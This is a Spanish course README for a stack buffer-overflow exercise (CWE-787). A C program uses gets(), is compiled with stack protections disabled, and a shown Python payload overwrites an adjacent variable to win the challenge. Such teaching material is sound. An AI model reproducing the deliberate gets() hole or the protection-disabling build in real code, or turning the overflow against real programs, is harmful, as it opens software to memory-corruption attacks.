# CWE-787: Out-of-bounds Write

Práctica de Programación Segura. Programa en C vulnerable a escritura fuera de
los límites de un buffer mediante `gets()`.

## Compilar (Linux, 32 bits)
```
gcc programa.c -o programa.out -fno-stack-protector -z execstack -ggdb -m32 -no-pie
```

## Reto
Lograr que la variable `cookie` valga `0x45464748` para imprimir `Ganaste!`.

El buffer `buf[4]` y la variable `cookie` quedan contiguos en la pila. Al escribir
4 bytes de relleno y 4 bytes más, estos últimos caen sobre `cookie`. Como el
almacenamiento es little-endian, para obtener `0x45464748` se escriben los bytes
`48 47 46 45`.

## Payload
```
python3 payload.py | ./programa.out
# equivalente:
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*4 + b"\x48\x47\x46\x45")' | ./programa.out
```
# cwe-787
